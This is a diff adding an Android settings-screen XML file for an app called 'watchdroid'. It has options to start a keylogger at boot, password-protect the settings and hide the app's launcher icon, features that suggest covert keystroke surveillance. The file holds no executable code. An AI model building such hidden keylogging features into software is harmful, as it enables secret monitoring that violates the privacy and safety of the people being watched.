@@ -1,0 +1,33 @@
+<?xml version="1.0" encoding="utf-8"?>
+<PreferenceScreen xmlns:android="http://schemas.android.com/apk/res/android">
+
+    <PreferenceCategory android:title="@string/general_category">
+        <CheckBoxPreference
+            android:key="boot"
+            android:summary="@string/keylogbootinfo"
+            android:title="@string/keylogboot"/>
+
+    </PreferenceCategory>
+
+    <PreferenceCategory android:title="@string/password_category">
+        <CheckBoxPreference
+            android:key="passonoff"
+            android:summary="@string/passinfo"
+            android:title="@string/passonoff"/>
+        <PreferenceScreen
+            android:key="renameCourses"
+            android:summary="@string/set_pass_info"
+            android:title="@string/set_pass">
+            <intent
+                android:action="com.watchdroid.Setpass"
+                android:targetClass="com.watchdroid.Setpass"
+                android:targetPackage="com.watchdroid" />
+        </PreferenceScreen>
+    </PreferenceCategory>
+    <PreferenceCategory android:title="@string/hideicon_category">
+        <CheckBoxPreference
+            android:key="hideicon"
+            android:summary="Show or Hide icon in launcher"
+            android:title="Hide Icon"/>
+    </PreferenceCategory>
+</PreferenceScreen>
